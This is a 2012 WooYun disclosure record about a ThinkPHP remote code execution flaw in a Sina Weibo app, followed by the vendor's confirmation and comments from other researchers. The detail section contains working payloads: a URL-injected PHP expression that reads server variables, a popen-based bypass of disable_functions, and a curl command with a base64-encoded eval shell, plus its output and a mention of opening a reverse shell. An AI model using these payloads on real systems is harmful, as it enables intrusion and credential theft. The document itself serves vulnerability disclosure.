{"id": 20053, "wybug_id": "wooyun-2012-06018", "wybug_title": "新浪微博任意代码执行漏洞+突破限制拿shell+可能深入其他动作", "wybug_corp": "新浪", "wybug_author": "牛奶坦克", "wybug_date": "2012-04-13 15:29", "wybug_open_date": "2012-05-28 15:30", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-04-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-05-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-05-28：\t细节向公众公开  简要描述： 新浪微博存在一处任意代码执行漏洞，但服务器有些disable_function限制，可惜太粗糙，导致绕过，反弹服务器shell，并可进一步渗透攻击。 详细说明：  Thinkphp的补丁被wooyun平台分析后，自己也读了一把，对漏洞发现者甚是膜拜，同时wofeiwo的出色分析也让人精神为之一爽，顿时湿了。这个漏洞因为工作原因跟的慢了一些，去官方成功案例看了一下，没想到看到新浪微博一个应用用了这个框架，看了一把，确实存在哟。http://tan.weibo.com/h/1/236/aaa/$%7B@print_r($_SERVER)%7D读取到了服务器的$_SERVER变量，里面甚至还存在数据库地址与密码。。本想执行个命令就提交wooyun，但是disable_functions了\nhttp://tan.weibo.com/h/1/236/aaa/$%7B@print(get_cfg_var('disable_functions'))%7D\n返回：\nphpinfo,system,exec,shell_exec,passthru,proc_open,proc_close,show_source\n呵呵，弱了点，突破方法很多，这里用popen做个exploit\nerror_reporting(E_ALL);$handle = popen('/bin/sh -c '.\"'$_POST[x]'\".' 2>&1', 'r');echo \"'$handle'; \" . gettype($handle) . \"\\n\";$read = fread($handle, 2096);echo $read;pclose($handle);die();\n为什么用POST是因为框架的URI取值问题，POST就畅通无阻了这个地方没处理单引号，方便了一些，但是poc里面的某些代码会干扰取值，所以encode一下\ncurl \"http://tan.weibo.com/h/1/236/aaa/$%7B@eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTskaGFuZGxlID0gcG9wZW4oJy9iaW4vc2ggLWMgJy4iJyRfUE9TVFt4XSciLicgMj4mMScsICdyJyk7ZWNobyAiJyRoYW5kbGUnOyAiIC4gZ2V0dHlwZSgkaGFuZGxlKSAuICJcbiI7JHJlYWQgPSBmcmVhZCgkaGFuZGxlLCAyMDk2KTtlY2hvICRyZWFkO3BjbG9zZSgkaGFuZGxlKTtkaWUoKTs'))%7D\" -d \"x=ls\"'Resource id #33'; resourceApiConfDataLibPublicThinkPHPTplapi.phpco.phpdbfavicon.icoindex.phpoauthcallback.phppictureDownLoad.phpssocallback.phpsystemt.php\n嘿。这个因为访问权限的问题，可以访问到这个服务器上所有的源码。因为是服务器群，所以执行的命令可能一会A，一会B，一会C。。这个自己想办法吧，既然可以执行命令了，直接弹shell。   漏洞证明：  一些截图：\n\n\n\n\n\n\n\n   修复方案：  修复方案：https://code.google.com/p/thinkphp/source/detail?spec=svn2904&r=2838ThinkPHP漏洞分析：http://zone.wooyun.org/index.php?do=view&id=44   版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-04-13 15:55 厂商回复： 感谢提供,您所提到的这个问题在您提交WOOYUN之前新浪已在修复,再次感谢您对新浪安全的支持! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-04-13 15:30 |    \t\t坏人咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:4        | 做一个简简单单的坏人)\t\t \n  沙发看来新浪不怎么关注安全新闻呀！！！    \n     2012-04-13 15:45 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这，微博，不要啊！！！！！    \n     2012-04-13 15:50 |    \t\tLee \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:24        | wataru@eviloctal.com)\t\t \n  @xsser 我操。这个严重。    \n     2012-04-13 15:54 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  这个爽。。。    \n     2012-04-13 15:54 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @z@cx 渗透师在哪里    \n     2012-04-13 15:55 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n  火前留名    \n     2012-04-13 15:56 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @xsser 纯观望中。。。    \n     2012-04-13 16:02 |    \t\tGaRY \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:3        | 真悲剧平男君)\t\t \n  神了，重点关注    \n     2012-04-13 16:03 |    \t\tGaRY \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:3        | 真悲剧平男君)\t\t \n  rank只有10？看来不是很严重么？    \n     2012-04-13 16:37 |    \t\tadsltsee \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 这个家伙很懒，什么也没留下...)\t\t \n  亲爱的微博。。。又出洞洞了    \n     2012-04-13 19:17 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  没用过微博的路过！    \n     2012-04-14 09:27 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  mark    \n     2012-04-14 11:24 |    \t\t小一 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:13        )\t\t \n  这个犀利了，要是深入的话不知要泄漏多少信息了。。    \n     2012-04-14 11:46 |    \t\t明.   \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:7        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  求深入啊.    \n     2012-04-15 08:22 |    \t\t新浪(乌云厂商)\t\t \n  @小一 是一个微博应用 上使用的Thinkphp 框架没有打补丁，使用该微博应用使用open api开发，用户使用时需要单独授权，实际上相当于一个开放平台第三方应用。应用中没有用户的什么信息，所以也不会泄露微博用户的信息。    \n     2012-04-15 22:58 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  @新浪 呵呵，还没有看到问题的本质么？    \n     2012-04-15 23:04 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @新浪 问题在于内部安全区域的限制被攻破吧，谁说A应用出漏洞就不会影响到B应用呢？    \n     2012-04-15 23:23 |    \t\tGaRY \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:3        | 真悲剧平男君)\t\t \n  @新浪 被楼上几位围攻，我也凑热闹at一下    \n     2012-04-16 09:28 |    \t\t紫梦芊 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:9        | 踏踏实实做测试)\t\t \n  @新浪 框架没打补丁以及不升级 不知害了多少无辜的服务器~ 哎    \n     2012-04-30 11:58 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  这个确实严重    \n     2012-05-28 16:16 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  新浪应该给洞主妹纸，不应该送娃娃了    \n     2012-05-28 16:35 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个事件是由一个点，反映出一个面的问题，希望厂商重视暴露出的其他安全问题。    \n     2012-05-28 16:55 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @疯狗 是的。。rank给少了。。并且报告写得不错。    \n     2012-05-28 17:00 |    \t\tunic02n \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        | 我是来学习的！)\t\t \n  这个确实不应该给10.进入点的漏洞虽然级别不高（在sina看来），但是实际影响的是另一个层次。人家不是给你汇报你存在框架漏洞，是告诉你你的服务器被搞了，    \n     2012-05-28 19:18 |    \t\t牛奶坦克 \t\t\t( 普通白帽子  |\t\t\t        Rank:355 漏洞数:21        | 晚安,牛奶)\t\t \n  感谢大家支持，没有针对厂商的意思，但是希望大家能看到wooyun给任何一方带来的额外信息，而不是单只看漏洞。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}